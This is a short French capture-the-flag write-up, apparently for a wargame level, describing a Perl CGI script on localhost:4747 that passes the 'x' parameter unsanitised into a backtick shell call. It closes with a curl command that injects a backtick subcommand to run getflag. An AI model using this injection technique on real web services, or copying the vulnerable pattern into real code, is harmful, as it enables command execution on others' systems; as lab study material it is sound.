Dans le répertoire de l'utilisateur, il y a un script perl.
Plus tôt, nous avions trouvés un dossier `/var/www/level04` (impossible à lire avant le level04).
À l'intérieur, le fichier est le même que celui du dossier de l'utilisateur.

Le script contient une adresse : `localhost:4747`. Étant donné qu'il est disponible dans `/var/www`, on peut imaginer qu'on peut l'executer via un appel web via curl par exemple.

Dans le script 
```pl
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```
on voit que le paramètre `x` est utilisé, puis sa valeur est imprimée à la place de $y.
On peut donc passer une sous commande:
```bash
curl 'localhost:4747?x=`getflag`'
```
